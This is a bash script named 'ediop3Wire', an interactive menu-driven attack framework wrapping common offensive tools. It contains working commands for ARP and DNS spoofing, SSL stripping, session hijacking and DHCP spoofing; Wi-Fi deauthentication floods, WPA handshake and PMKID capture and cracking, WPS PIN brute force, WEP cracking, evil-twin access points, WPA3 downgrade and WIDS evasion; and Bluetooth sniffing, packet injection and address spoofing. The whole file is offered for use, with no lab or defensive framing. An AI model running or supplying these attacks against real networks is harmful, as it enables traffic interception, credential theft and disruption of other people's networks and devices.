#!/bin/bash

# =======================================
# ediop3Wire FRAMEWORK - MADE BY EDIOP3
# =======================================

INTERFACE="wlan0"
BLUETOOTH_DEV="hci0"
MONITOR_MODE=false
LOG_DIR="/var/log/ediop3wire"
MITM_DIR="$LOG_DIR/mitm"
TARGET_IP=""
GATEWAY_IP=""
DNS_SERVER="8.8.8.8"
BT_TARGET=""
BLE_CHARACTERISTIC=""

CHANNEL="1"
TARGET_BSSID=""
TARGET_SSID=""
WORDLIST_FILE=""
NEW_MAC=""
HANDSHAKE_CAPTURED=false
DEAUTH_COUNT=1000
DEAUTH_INTERVAL=1
HANDSHAKE_FILE="/tmp/handshake.pcap"
SCAN_DURATION=60
PMKID_FILE="/tmp/pmkid.pcap"
WPS_PIN=""
CLIENT_MAC=""
KRACK_ATTEMPTS=5
WEP_KEY=""
WEP_IVS=5000
PIXIE_DUST_TIMEOUT=120
WPA3_ATTEMPTS=3
SAVE_TRAFFIC=false
TRAFFIC_FILE="/tmp/captured_traffic.pcap"
BEACON_COUNT=50
BEACON_INTERVAL=100
HIDDEN_SSID=""
WIDS_CONFUSE=false
LONG_RANGE_ATTACK=false
FRAGMENTATION_SIZE=256
TIME_DELAY=0
PACKET_SIZE=600
REAVER_TIMEOUT=60
NULL_PROBE=false
AIRGEDDON_MODE=false
WPA_SUPPLICANT_CONF="/tmp/wpa_supplicant.conf"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

if [ "$(id -u)" -ne 0 ]; then
    echo -e "${RED}[!] This script must be run as root${NC}"
    exit 1
fi

mkdir -p "$MITM_DIR"
mkdir -p "$LOG_DIR/bluetooth"
mkdir -p "$LOG_DIR/wifi"

check_dependencies() {
    local wifi_deps=("iw" "ifconfig" "ip" "tshark" "aireplay-ng" "hostapd" "aircrack-ng" 
                    "airodump-ng" "hcxdumptool" "hcxpcapngtool" "mdk4" "reaver" "bully" 
                    "pixiewps" "wash" "mdk3" "wifite" "bettercap" "ettercap" "nmap" 
                    "dsniff" "driftnet" "tcpdump" "fern-wifi-cracker" "kismet" "wireshark" 
                    "bully" "mfoc" "cowpatty" "pyrit" "asleap" "ike-scan" "freeradius-wpe" 
                    "hostapd-wpe")
    
    local net_deps=("iptables" "ettercap" "bettercap" "arpspoof" "dnsspoof" "tshark")
    
    local bt_deps=("gatttool" "btmon" "hciconfig" "hcitool" "bluez" "rfcomm" "gnuradio" 
                  "gr-bluetooth" "python3" "nodejs" "btlejack" "l2ping" "l2test")
    
    local missing=()
    
    for dep in "${wifi_deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            missing+=("$dep")
        fi
    done
    
    for dep in "${net_deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            if [[ ! " ${missing[@]} " =~ " ${dep} " ]]; then
                missing+=("$dep")
            fi
        fi
    done
    
    for dep in "${bt_deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            if [[ ! " ${missing[@]} " =~ " ${dep} " ]]; then
                missing+=("$dep")
            fi
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${RED}[-] Missing dependencies:${NC}"
        printf "  - %s\n" "${missing[@]}"
        echo -e "${YELLOW}[+] Try: apt install ${missing[*]}${NC}"
        exit 1
    fi
}

# ======================
# haker 
# ======================

interface_control() {
    echo -e "${GREEN}[+] Network Interface Control${NC}"
    echo "1. Bring interface up"
    echo "2. Bring interface down"
    echo "3. Change MAC address"
    echo "4. Set monitor mode"
    echo "5. Set managed mode"
    echo "6. Show interface info"
    read -p "Select option: " opt
    
    case $opt in
        1) ip link set "$INTERFACE" up ;;
        2) ip link set "$INTERFACE" down ;;
        3) 
            read -p "Enter new MAC: " mac
            ip link set "$INTERFACE" down
            ip link set "$INTERFACE" address "$mac"
            ip link set "$INTERFACE" up
            ;;
        4) 
            ip link set "$INTERFACE" down
            iw "$INTERFACE" set type monitor
            ip link set "$INTERFACE" up
            MONITOR_MODE=true
            ;;
        5) 
            ip link set "$INTERFACE" down
            iw "$INTERFACE" set type managed
            ip link set "$INTERFACE" up
            MONITOR_MODE=false
            ;;
        6) ip -br link show "$INTERFACE" ;;
        *) echo -e "${RED}[-] Invalid option${NC}" ;;
    esac
}

iptables_control() {
    echo -e "${GREEN}[+] IPTables Management${NC}"
    echo "1. Block IP"
    echo "2. Allow IP"
    echo "3. Block port"
    echo "4. Allow port"
    echo "5. Show rules"
    echo "6. Flush rules"
    read -p "Select option: " opt
    
    case $opt in
        1) 
            read -p "Enter IP to block: " ip
            iptables -A INPUT -s "$ip" -j DROP
            ;;
        2) 
            read -p "Enter IP to allow: " ip
            iptables -A INPUT -s "$ip" -j ACCEPT
            ;;
        3) 
            read -p "Enter port to block: " port
            iptables -A INPUT -p tcp --dport "$port" -j DROP
            ;;
        4) 
            read -p "Enter port to allow: " port
            iptables -A INPUT -p tcp --dport "$port" -j ACCEPT
            ;;
        5) iptables -L -n -v ;;
        6) iptables -F ;;
        *) echo -e "${RED}[-] Invalid option${NC}" ;;
    esac
}

route_control() {
    echo -e "${GREEN}[+] Route Management${NC}"
    echo "1. Add route"
    echo "2. Delete route"
    echo "3. Show routing table"
    echo "4. Change default gateway"
    read -p "Select option: " opt
    
    case $opt in
        1) 
            read -p "Enter network: " net
            read -p "Enter gateway: " gw
            ip route add "$net" via "$gw"
            ;;
        2) 
            read -p "Enter network to delete: " net
            ip route del "$net"
            ;;
        3) ip route show ;;
        4) 
            read -p "Enter new gateway: " gw
            ip route del default
            ip route add default via "$gw"
            ;;
        *) echo -e "${RED}[-] Invalid option${NC}" ;;
    esac
}

# ======================
# Bluetooth/BLE Attacks (ofc cuz why not. HAKERBO8 LOL)
# ======================

bluetooth_attacks() {
    echo -e "${GREEN}[+] Bluetooth/BLE Attacks${NC}"
    echo "1. Scan for devices"
    echo "2. BR/EDR sniffing"
    echo "3. BLE sniffing"
    echo "4. BLE GATT enumeration"
    echo "5. RFCOMM channel scan"
    echo "6. L2CAP packet injection"
    echo "7. Bluetooth spoofing"
    read -p "Select option: " opt
    
    case $opt in
        1) 
            hciconfig "$BLUETOOTH_DEV" up
            hcitool scan
            ;;
        2) 
            read -p "Enter target BDADDR: " target
            echo -e "${YELLOW}[*] Starting BR/EDR sniffing (CTRL+C to stop)...${NC}"
            btmon -w "$LOG_DIR/bluetooth/bredr_sniff_$(date +%s).pcap" &
            l2ping -f "$target"
            ;;
        3) 
            read -p "Enter target BDADDR: " target
            echo -e "${YELLOW}[*] Starting BLE sniffing (CTRL+C to stop)...${NC}"
            btlejack -d "$target" -c "$LOG_DIR/bluetooth/ble_sniff_$(date +%s).pcap"
            ;;
        4) 
            read -p "Enter target BDADDR: " target
            gatttool -b "$target" --primary
            read -p "Enter handle to read: " handle
            gatttool -b "$target" --char-read -a "$handle"
            ;;
        5) 
            read -p "Enter target BDADDR: " target
            for channel in {1..30}; do
                rfcomm -r "$channel" connect "$target" "$channel" 2>&1 | grep -v "Can't"
            done
            ;;
        6) 
            read -p "Enter target BDADDR: " target
            read -p "Enter channel: " channel
            read -p "Enter hex payload: " payload
            l2test -b "$target" -c "$channel" -P "$payload"
            ;;
        7)
            read -p "Enter target BDADDR to spoof: " target
            read -p "Enter new BDADDR: " newaddr
            bdaddr -i "$BLUETOOTH_DEV" "$newaddr"
            hciconfig "$BLUETOOTH_DEV" reset
            ;;
        *) echo -e "${RED}[-] Invalid option${NC}" ;;
    esac
}

# ======================
# MITM Attacks (YES)
# ======================

mitm_attacks() {
    echo -e "${GREEN}[+] MITM Attacks${NC}"
    echo "1. ARP spoofing"
    echo "2. DNS spoofing"
    echo "3. SSL stripping"
    echo "4. Full packet capture"
    echo "5. Session hijacking"
    echo "6. Real-time packet tampering"
    echo "7. DHCP spoofing"
    read -p "Select option: " opt
    
    case $opt in
        1) 
            read -p "Enter target IP: " target
            read -p "Enter gateway IP: " gateway
            echo -e "${YELLOW}[*] Starting ARP spoofing...${NC}"
            arpspoof -i "$INTERFACE" -t "$target" -r "$gateway" > "$MITM_DIR/arpspoof.log" 2>&1 &
            echo 1 > /proc/sys/net/ipv4/ip_forward
            ;;
        2) 
            echo -e "${YELLOW}[*] Starting DNS spoofing...${NC}"
            echo "$TARGET_IP *" > /tmp/dnsspoof.conf
            dnsspoof -i "$INTERFACE" -f /tmp/dnsspoof.conf > "$MITM_DIR/dnsspoof.log" 2>&1 &
            ;;
        3) 
            echo -e "${YELLOW}[*] Starting SSL stripping...${NC}"
            bettercap -eval "set arp.spoof.targets $TARGET_IP; arp.spoof on; net.sniff on; sslstrip on"
            ;;
        4) 
            echo -e "${YELLOW}[*] Starting packet capture...${NC}"
            tshark -i "$INTERFACE" -w "$MITM_DIR/full_capture_$(date +%s).pcap" > "$MITM_DIR/tshark.log" 2>&1 &
            ;;
        5) 
            echo -e "${YELLOW}[*] Attempting session hijacking...${NC}"
            ettercap -T -q -i "$INTERFACE" -M arp:remote /"$TARGET_IP"/ // > "$MITM_DIR/ettercap.log" 2>&1 &
            ;;
        6) 
            echo -e "${YELLOW}[*] Starting real-time packet tampering...${NC}"
            bettercap -eval "set arp.spoof.targets $TARGET_IP; arp.spoof on; net.sniff on; net.proxy on"
            ;;
        7)
            echo -e "${YELLOW}[*] Starting DHCP spoofing...${NC}"
            bettercap -eval "set dhcp.spoof.targets $TARGET_IP; dhcp.spoof on"
            ;;
        *) echo -e "${RED}[-] Invalid option${NC}" ;;
    esac
}

# ======================
# WiFi Attacks (YEEEES)
# ======================

start_monitor_mode() {
    if [ "$MONITOR_MODE" == "false" ]; then
        echo "[+] Enabling monitor mode on $INTERFACE"
        airmon-ng check kill &>/dev/null
        ip link set $INTERFACE down
        iw dev $INTERFACE set type monitor
        ip link set $INTERFACE up
        MONITOR_MODE="true"
        echo "[+] Monitor mode enabled"
    fi
}

stop_monitor_mode() {
    if [ "$MONITOR_MODE" == "true" ]; then
        echo "[+] Disabling monitor mode on $INTERFACE"
        ip link set $INTERFACE down
        iw dev $INTERFACE set type managed
        ip link set $INTERFACE up
        service network-manager restart &>/dev/null
        MONITOR_MODE="false"
        echo "[+] Monitor mode disabled"
    fi
}

scan_networks() {
    start_monitor_mode
    echo "[+] Scanning networks for $SCAN_DURATION seconds..."
    airodump-ng -w "$LOG_DIR/wifi/scan_results" --output-format csv --write-interval 1 $INTERFACE &>/dev/null &
    PID=$!
    sleep $SCAN_DURATION
    kill -TERM $PID
    wait $PID
    
    echo -e "\n[+] Discovered Networks:"
    echo "================================================================================="
    echo "BSSID              | CH | ENC  | CIPHER | AUTH | POWER | #CLIENTS | ESSID"
    echo "================================================================================="
    awk -F',' '/^[^BSSID]/ {
        printf "%-18s | %-2s | %-4s | %-6s | %-4s | %-5s | %-8s | %s\n", 
        $1, $4, $5, $6, $7, $8, $9, $14
    }' "$LOG_DIR/wifi/scan_results-01.csv" | sort -k3
    
    echo -e "\n[+] Client Devices:"
    echo "================================================================="
    echo "MAC Address       | Power | Packets | Probed ESSIDs"
    echo "================================================================="
    awk -F',' '/^[^Station MAC]/ {
        printf "%-17s | %-5s | %-7s | %s\n", $1, $4, $5, $7
    }' "$LOG_DIR/wifi/scan_results-01.csv" | sort -k2nr
}

deauth_attack() {
    if [ -z "$TARGET_BSSID" ]; then
        read -p "[?] Enter target BSSID: " TARGET_BSSID
    fi
    
    read -p "[?] Target specific client? (y/n): " TARGET_CLIENT
    if [[ "$TARGET_CLIENT" =~ ^[Yy]$ ]]; then
        read -p "[?] Enter client MAC: " CLIENT_MAC
        echo "[+] Launching targeted deauth attack..."
        aireplay-ng --deauth $DEAUTH_COUNT -a $TARGET_BSSID -c $CLIENT_MAC $INTERFACE
    else
        echo "[+] Launching broadcast deauth attack..."
        aireplay-ng --deauth $DEAUTH_COUNT -a $TARGET_BSSID $INTERFACE
    fi
}

capture_handshake() {
    if [ -z "$TARGET_BSSID" ]; then
        read -p "[?] Enter target BSSID: " TARGET_BSSID
    fi
    if [ -z "$CHANNEL" ]; then
        read -p "[?] Enter channel: " CHANNEL
    fi
    
    echo "[+] Starting handshake capture on $TARGET_BSSID channel $CHANNEL..."
    airodump-ng -c $CHANNEL --bssid $TARGET_BSSID -w "$LOG_DIR/wifi/handshake" $INTERFACE &
    PID=$!
    
    echo "[+] Sending deauthentication packets to capture handshake..."
    aireplay-ng --deauth 4 -a $TARGET_BSSID $INTERFACE &>/dev/null
    
    sleep 10
    if grep -q "WPA handshake" <(tail -n 10 "$LOG_DIR/wifi/airodump.log"); then
        HANDSHAKE_CAPTURED=true
        echo "[+] WPA handshake captured!"
        kill $PID
    else
        echo "[-] Failed to capture handshake. Trying again..."
        aireplay-ng --deauth 4 -a $TARGET_BSSID $INTERFACE &>/dev/null
        sleep 10
        if grep -q "WPA handshake" <(tail -n 10 "$LOG_DIR/wifi/airodump.log"); then
            HANDSHAKE_CAPTURED=true
            echo "[+] WPA handshake captured!"
            kill $PID
        else
            echo "[-] Failed to capture handshake after multiple attempts"
            kill $PID
            return 1
        fi
    fi
}

crack_wpa2() {
    if [ -z "$WORDLIST_FILE" ]; then
        read -p "[?] Enter path to wordlist: " WORDLIST_FILE
        if [ ! -f "$WORDLIST_FILE" ]; then
            echo "[-] Wordlist file not found!"
            return 1
        fi
    fi
    
    echo "[+] Available cracking methods:"
    echo "  1) Aircrack-ng (CPU)"
    echo "  2) Hashcat (GPU)"
    echo "  3) Pyrit (GPU/CPU)"
    echo "  4) Cowpatty (PMK)"
    read -p "[?] Select method (1-4): " CRACK_METHOD
    
    case $CRACK_METHOD in
        1)
            echo "[+] Starting aircrack-ng..."
            aircrack-ng -w $WORDLIST_FILE "$LOG_DIR/wifi/handshake-01.cap"
            ;;
        2)
            echo "[+] Converting to hashcat format..."
            hcxpcapngtool -o "$LOG_DIR/wifi/hash.hc22000" "$LOG_DIR/wifi/handshake-01.cap"
            echo "[+] Starting hashcat..."
            hashcat -m 22000 "$LOG_DIR/wifi/hash.hc22000" $WORDLIST_FILE
            ;;
        3)
            echo "[+] Starting pyrit..."
            pyrit -r "$LOG_DIR/wifi/handshake-01.cap" -i $WORDLIST_FILE attack_passthrough
            ;;
        4)
            echo "[+] Generating PMK..."
            cowpatty -r "$LOG_DIR/wifi/handshake-01.cap" -f $WORDLIST_FILE -s "$TARGET_SSID" -d "$LOG_DIR/wifi/pmk_cache"
            ;;
        *)
            echo "[-] Invalid option"
            return 1
            ;;
    esac
}

rogue_ap() {
    read -p "[?] Enter SSID to spoof: " TARGET_SSID
    read -p "[?] Enter channel (1-13): " CHANNEL
    read -p "[?] Enable captive portal? (y/n): " PORTAL
    
    echo "[+] Setting up rogue AP..."
    cat <<EOF > /tmp/hostapd.conf
interface=$INTERFACE
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=$CHANNEL
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

    if [[ "$PORTAL" =~ ^[Yy]$ ]]; then
        echo "[+] Setting up captive portal..."
        dnsmasq -C /dev/null -kd -F 192.168.1.100,192.168.1.200 -i $INTERFACE --dhcp-option=3,192.168.1.1 &
        hostapd /tmp/hostapd.conf &
        python3 -m http.server 80 &
        echo "[+] Captive portal running. Press Ctrl+C to stop..."
        wait
    else
        hostapd /tmp/hostapd.conf &
        echo "[+] Rogue AP running. Press Ctrl+C to stop..."
        wait
    fi
}

pmkid_attack() {
    if [ -z "$TARGET_BSSID" ]; then
        read -p "[?] Enter target BSSID: " TARGET_BSSID
    fi
    
    echo "[+] Capturing PMKID..."
    hcxdumptool -i $INTERFACE -o "$LOG_DIR/wifi/pmkid" --enable_status=1 --filterlist_ap=$TARGET_BSSID &
    PID=$!
    sleep 60
    kill -INT $PID
    
    if [ -s "$LOG_DIR/wifi/pmkid" ]; then
        echo "[+] PMKID captured! Converting..."
        hcxpcaptool -z "$LOG_DIR/wifi/pmkid_hash" "$LOG_DIR/wifi/pmkid"
        echo "[+] Cracking with hashcat..."
        hashcat -m 16800 "$LOG_DIR/wifi/pmkid_hash" $WORDLIST_FILE
    else
        echo "[-] Failed to capture PMKID"
    fi
}

wps_attack() {
    echo "[+] Scanning for WPS-enabled networks..."
    wash -i $INTERFACE -C -o "$LOG_DIR/wifi/wps_scan"
    
    if [ ! -s "$LOG_DIR/wifi/wps_scan" ]; then
        echo "[-] No WPS-enabled networks found"
        return 1
    fi
    
    echo -e "\n[+] WPS-enabled networks:"
    cat "$LOG_DIR/wifi/wps_scan"
    
    read -p "[?] Enter target BSSID: " TARGET_BSSID
    read -p "[?] Enter channel: " CHANNEL
    
    echo "[+] Select WPS attack method:"
    echo "  1) Reaver (PIN brute force)"
    echo "  2) Bully (PIN brute force)"
    echo "  3) Pixie Dust (offline attack)"
    read -p "[?] Choose (1-3): " WPS_METHOD
    
    case $WPS_METHOD in
        1)
            reaver -i $INTERFACE -b $TARGET_BSSID -c $CHANNEL -vv -K 1 -d 5
            ;;
        2)
            bully -b $TARGET_BSSID -c $CHANNEL -B -v 3 $INTERFACE
            ;;
        3)
            reaver -i $INTERFACE -b $TARGET_BSSID -c $CHANNEL -K -vv
            ;;
        *)
            echo "[-] Invalid option"
            return 1
            ;;
    esac
}

wep_crack() {
    if [ -z "$TARGET_BSSID" ]; then
        read -p "[?] Enter target BSSID: " TARGET_BSSID
    fi
    if [ -z "$CHANNEL" ]; then
        read -p "[?] Enter channel: " CHANNEL
    fi
    
    echo "[+] Starting WEP attack..."
    airodump-ng -c $CHANNEL --bssid $TARGET_BSSID -w "$LOG_DIR/wifi/wep_capture" $INTERFACE &
    PID=$!
    
    aireplay-ng -1 0 -a $TARGET_BSSID -h $(macchanger -s $INTERFACE | grep Current | awk '{print $3}') $INTERFACE
    
    aireplay-ng -3 -b $TARGET_BSSID -h $(macchanger -s $INTERFACE | grep Current | awk '{print $3}') $INTERFACE &
    
    aircrack-ng -b $TARGET_BSSID "$LOG_DIR/wifi/wep_capture-01.cap"
    
    kill $PID
}

wpa3_attack() {
    if [ -z "$TARGET_BSSID" ]; then
        read -p "[?] Enter target BSSID: " TARGET_BSSID
    fi
    
    echo "[+] Attempting WPA3 downgrade attack..."
    for i in $(seq 1 $WPA3_ATTEMPTS); do
        echo "[+] Attempt $i/$WPA3_ATTEMPTS..."
        mdk4 $INTERFACE a -a $TARGET_BSSID -m
        sleep 5
    done
    
    echo "[+] Checking for downgrade..."
    airodump-ng $INTERFACE --bssid $TARGET_BSSID -w "$LOG_DIR/wifi/wpa3_downgrade"
    if grep -q "WPA2" "$LOG_DIR/wifi/wpa3_downgrade-01.csv"; then
        echo "[+] Network downgraded to WPA2!"
        read -p "[?] Attempt handshake capture? (y/n): " CAPTURE
        if [[ "$CAPTURE" =~ ^[Yy]$ ]]; then
            capture_handshake
        fi
    else
        echo "[-] Failed to downgrade network"
    fi
}

hidden_ssid() {
    if [ -z "$TARGET_BSSID" ]; then
        read -p "[?] Enter target BSSID: " TARGET_BSSID
    fi
    
    echo "[+] Discovering hidden SSID..."
    airodump-ng --bssid $TARGET_BSSID -c $CHANNEL $INTERFACE &
    PID=$!
    
    aireplay-ng --deauth 10 -a $TARGET_BSSID $INTERFACE
    
    sleep 10
    kill $PID
    
    if [ -n "$(grep $TARGET_BSSID "$LOG_DIR/wifi/airodump.log" | grep -v '<length:  0>')" ]; then
        HIDDEN_SSID=$(grep $TARGET_BSSID "$LOG_DIR/wifi/airodump.log" | awk '{print $14}')
        echo "[+] Discovered hidden SSID: $HIDDEN_SSID"
    else
        echo "[-] Failed to discover hidden SSID"
    fi
}

beacon_flood() {
    read -p "[?] Enter SSID for beacon flood: " FLOOD_SSID
    read -p "[?] Enter channel: " CHANNEL
    
    echo "[+] Creating beacon flood..."
    mdk3 $INTERFACE b -n "$FLOOD_SSID" -c $CHANNEL -s $BEACON_COUNT -w
}

wids_confuse() {
    if [ -z "$TARGET_BSSID" ]; then
        read -p "[?] Enter target BSSID: " TARGET_BSSID
    fi
    
    echo "[+] Confusing WIDS/WIPS..."
    mdk3 $INTERFACE w -e "$TARGET_SSID" -c $CHANNEL -z
}

long_range_attack() {
    if [ -z "$TARGET_BSSID" ]; then
        read -p "[?] Enter target BSSID: " TARGET_BSSID
    fi
    
    echo "[+] Configuring for long-range attack..."
    iwconfig $INTERFACE frag $FRAGMENTATION_SIZE
    iwconfig $INTERFACE rts $PACKET_SIZE
    iwconfig $INTERFACE rate 1M
    
    echo "[+] Starting attack with timing delays..."
    aireplay-ng --deauth 0 -a $TARGET_BSSID -x $TIME_DELAY $INTERFACE
}

null_probe() {
    if [ -z "$TARGET_BSSID" ]; then
        read -p "[?] Enter target BSSID: " TARGET_BSSID
    fi
    
    echo "[+] Sending null probe requests..."
    mdk3 $INTERFACE p -t $TARGET_BSSID -n "$TARGET_SSID"
}

# ======================
# Main Menu (BECAUSE YES)
# ======================

main_menu() {
    while true; do
        clear
        echo -e "${BLUE}=== ediop3Wire ===${NC}"
        echo -e "${GREEN}1. Network Interface Control${NC}"
        echo -e "${GREEN}2. IPTables Firewall Management${NC}"
        echo -e "${GREEN}3. Network Route Control${NC}"
        echo -e "${GREEN}4. Bluetooth/BLE Attacks${NC}"
        echo -e "${GREEN}5. MITM Attacks${NC}"
        echo -e "${GREEN}6. WiFi Attacks${NC}"
        echo -e "${RED}7. Exit${NC}"
        read -p "Select option: " opt
        
        case $opt in
            1) interface_control ;;
            2) iptables_control ;;
            3) route_control ;;
            4) bluetooth_attacks ;;
            5) mitm_attacks ;;
            6) wifi_attacks_menu ;;
            7) 
                echo -e "${YELLOW}[+] Cleaning up...${NC}"
                pkill -f "arpspoof|dnsspoof|ettercap|bettercap|tshark|btmon|airodump|aircrack|hostapd|dnsmasq"
                echo 0 > /proc/sys/net/ipv4/ip_forward
                iptables -F
                stop_monitor_mode
                exit 0
                ;;
            *) echo -e "${RED}[-] Invalid option${NC}" ;;
        esac
        
        read -p "Press Enter to continue..."
    done
}

wifi_attacks_menu() {
    while true; do
        clear
        echo -e "${BLUE}=== WiFi Attacks ===${NC}"
        echo "1. Scan networks"
        echo "2. Deauth attack"
        echo "3. Capture WPA handshake"
        echo "4. Crack WPA2"
        echo "5. PMKID attack"
        echo "6. WPS PIN attack"
        echo "7. WEP cracking"
        echo "8. Evil Twin attack"
        echo "9. WPA3 downgrade"
        echo "10. Hidden SSID discovery"
        echo "11. Beacon flood"
        echo "12. WIDS confusion"
        echo "13. Long-range attack"
        echo "14. Null probe attack"
        echo "15. Return to main menu"
        read -p "Select option: " opt
        
        case $opt in
            1) scan_networks ;;
            2) deauth_attack ;;
            3) capture_handshake ;;
            4) crack_wpa2 ;;
            5) pmkid_attack ;;
            6) wps_attack ;;
            7) wep_crack ;;
            8) rogue_ap ;;
            9) wpa3_attack ;;
            10) hidden_ssid ;;
            11) beacon_flood ;;
            12) wids_confuse ;;
            13) long_range_attack ;;
            14) null_probe ;;
            15) break ;;
            *) echo -e "${RED}[-] Invalid option${NC}" ;;
        esac
        
        read -p "Press Enter to continue..."
    done
}

# ok
check_dependencies
main_menu
